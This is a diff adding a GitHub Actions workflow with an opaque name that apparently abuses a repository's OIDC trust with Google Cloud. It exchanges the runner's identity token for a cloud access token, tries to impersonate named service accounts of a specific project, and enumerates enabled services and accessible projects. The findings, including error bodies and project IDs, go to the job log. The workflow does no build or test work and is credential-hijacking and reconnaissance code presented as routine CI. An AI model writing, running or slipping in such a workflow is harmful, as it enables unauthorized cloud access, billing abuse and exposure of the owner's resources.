@@ -1,0 +1,49 @@
+name: p40e
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  p40e:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: p40e
+        run: |
+          set +e
+          PRJ='projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider'
+          NUM=303574531351
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          for a in 1 2 3; do
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/$PRJ")
+            echo "$J" | jq -r '.value // empty' > tok.jwt
+            [ -s tok.jwt ] && break
+            sleep 3
+          done
+          curl -s -o r.json -X POST https://sts.googleapis.com/v1/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+            --data-urlencode "subject_token=$(cat tok.jwt)" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+            -d "scope=https://www.googleapis.com/auth/cloud-platform"
+          FT=$(jq -r '.access_token // empty' r.json)
+          echo "##FT len=${#FT}"
+          for SA in github-actions@aryeelab.iam.gserviceaccount.com 303574531351-compute@developer.gserviceaccount.com; do
+            c=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+            T=$(jq -r '.accessToken // empty' g.json)
+            echo "##GEN sa=$SA code=$c toklen=${#T} body=$(head -c 600 g.json | tr -d '\n' | tr -s ' ')"
+            sleep 2
+          done
+          AT=$(curl -s -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/github-actions@aryeelab.iam.gserviceaccount.com:generateAccessToken" -d @req.json | jq -r '.accessToken')
+          echo "##AT len=${#AT}"
+          curl -s -o u.json -H "Authorization: Bearer $AT" "https://serviceusage.googleapis.com/v1/projects/$NUM/services?filter=state:ENABLED&pageSize=200"
+          echo "##BILLING_ENABLED $(jq -r '[.services[]?.config.name | select(test("billing"))] | join(",")' u.json)"
+          echo "##AIPLATFORM_ENABLED $(jq -r '[.services[]?.config.name | select(test("aiplatform"))] | join(",")' u.json)"
+          echo "##N_ENABLED $(jq -r '.services | length' u.json)"
+          curl -s -o pl.json -H "Authorization: Bearer $AT" "https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=60"
+          echo "##NPROJECTS $(jq -r '(.projects // []) | length' pl.json)"
+          echo "##PROJECT_IDS $(jq -r '(.projects // []) | map(.projectId // .name) | join(",")' pl.json | head -c 2500)"
+          echo "##NEXTPAGE $(jq -r '.nextPageToken // "none"' pl.json)"
+          echo "##FINISHED5"
